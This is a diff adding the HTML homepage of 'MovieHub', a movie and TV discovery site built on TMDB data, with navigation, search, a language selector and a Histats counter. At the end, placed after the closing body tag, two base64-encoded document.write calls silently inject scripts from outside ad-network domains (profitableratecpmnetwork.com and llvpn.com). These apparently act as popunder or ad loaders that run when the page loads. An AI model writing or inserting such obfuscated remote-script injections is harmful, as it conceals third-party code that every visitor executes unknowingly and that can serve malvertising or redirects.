@@ -1,0 +1,75 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#11161c">
+  <title>MovieHub — Movies & TV Shows</title>
+  <meta name="description" content="Discover popular movies and TV shows, explore ratings and release dates, and find your next watch.">
+  <meta name="robots" content="index,follow">
+  <link rel="icon" href="data:,">
+  <link rel="stylesheet" href="/assets/styles.css">
+  <script src="/assets/app.js" defer></script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="/en" aria-label="MovieHub home"><span class="brand-mark">▶</span><span>Movie<span class="brand-accent">Hub</span></span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en#movies" data-i18n="movies">Movies <span class="chevron">⌄</span></a>
+      <a href="/en#tv" data-i18n="tv">TV Shows <span class="chevron">⌄</span></a>
+      <a href="/en#genres" data-i18n="genres">Genres <span class="chevron">⌄</span></a>
+      <a href="/en#people" data-i18n="people">Popular People</a>
+    </nav>
+    <form class="search-form" id="search-form" role="search">
+      <input id="search-input" type="search" placeholder="Search..." aria-label="Search movies and TV shows">
+      <button type="submit" aria-label="Search">⌕</button>
+    </form>
+    <label class="language-wrap" aria-label="Choose language">
+      <span class="globe">◎</span>
+      <select id="language-select">
+        <option value="en">English</option><option value="id">Indonesia</option>
+        <option value="es">Español</option><option value="th">ไทย</option>
+        <option value="pt">Português</option><option value="fr">Français</option>
+        <option value="vi">Tiếng Việt</option><option value="bg">Български</option>
+      </select>
+    </label>
+    <div class="account-actions"><a class="sign-in" href="#signin" data-i18n="signIn">Sign In</a><a class="register" href="#register" data-i18n="register">Register</a></div>
+    <button class="mobile-menu" id="mobile-menu" aria-label="Toggle navigation">☰</button>
+  </header>
+
+  <main id="app">
+    <section class="hero">
+      <div class="hero-inner">
+        <p class="eyebrow" data-i18n="heroEyebrow">YOUR NEXT FAVORITE STARTS HERE</p>
+        <h1 data-i18n="heroTitle">Stream Free Movies &amp; TV Shows</h1>
+        <p class="hero-copy" data-i18n="heroCopy">Browse and discover your favorite movies and series.</p>
+        <a class="hero-cta" href="#movies" data-i18n="explore">Explore Movies <span>→</span></a>
+      </div>
+    </section>
+    <section class="catalog">
+      <div class="section-heading"><div><p class="section-kicker">MOVIEHUB COLLECTION</p><h2 data-i18n="popularMovies">Popular Movies</h2></div><div class="row-controls"><button data-scroll="popular-track" aria-label="Scroll left">‹</button><button data-scroll-right="popular-track" aria-label="Scroll right">›</button></div></div>
+      <div class="poster-track" id="popular-track"><div class="loading-card">Loading movies…</div></div>
+      <div id="home-sections"></div>
+      <section class="genre-strip" id="genres"><div><p class="section-kicker">FIND YOUR MOOD</p><h2 data-i18n="browseGenres">Browse by Genre</h2></div><div class="genre-list" id="genre-list"></div></section>
+      <section class="results-section hidden" id="search-results"><div class="section-heading"><div><p class="section-kicker" data-i18n="searchLabel">YOUR SEARCH</p><h2 id="search-title">Search results</h2></div></div><div class="results-grid" id="results-grid"></div></section>
+    </section>
+  </main>
+
+  <footer class="footer"><a class="brand footer-brand" href="/en"><span class="brand-mark">▶</span><span>Movie<span class="brand-accent">Hub</span></span></a><p data-i18n="footerNote">Discover movies and TV shows from TMDB.</p><small>This product uses the TMDB API but is not endorsed or certified by TMDB.</small></footer>
+  <div class="toast" id="toast" role="status" aria-live="polite"></div>
+   <!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4909850,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4909850&101" alt="free webpage counters" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+</body>
+       <script>document.write(atob("PHNjcmlwdCBzcmM9Imh0dHBzOi8vcGwyODYwNjkzNS5wcm9maXRhYmxlcmF0ZWNwbW5ldHdvcmsuY29tLzhhLzIwL2MwLzhhMjBjMDc1MDMwY2QwYjgzZTQ2NTRhMTMzOGMzZWIxLmpzIj48L3NjcmlwdD4="));</script>
+       <script>document.write(atob("PHNjcmlwdD4oZnVuY3Rpb24ocyl7cy5kYXRhc2V0LnpvbmU9JzEwMDQ3MTE3JyxzLnNyYz0naHR0cHM6Ly9sbHZwbi5jb20vdGFnLm1pbi5qcyd9KShbZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LCBkb2N1bWVudC5ib2R5XS5maWx0ZXIoQm9vbGVhbikucG9wKCkuYXBwZW5kQ2hpbGQoZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0JykpKTwvc2NyaXB0Pg=="));</script>
+</html>
